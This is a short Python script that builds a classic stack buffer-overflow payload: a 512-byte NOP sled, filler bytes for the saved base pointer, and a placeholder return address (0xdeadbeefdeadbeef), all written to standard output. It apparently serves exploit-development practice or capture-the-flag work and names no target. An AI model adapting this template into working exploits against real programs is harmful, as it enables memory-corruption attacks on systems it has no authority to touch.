#!/usr/bin/python

import struct
import sys

buffsize = 512
offset = 0

nopsled = b'\x90'*(buffsize)
rbp = b'\x90'*8
rip = struct.pack("<Q", 0xdeadbeefdeadbeef)

sys.stdout.buffer.write(nopsled+rbp+rip)
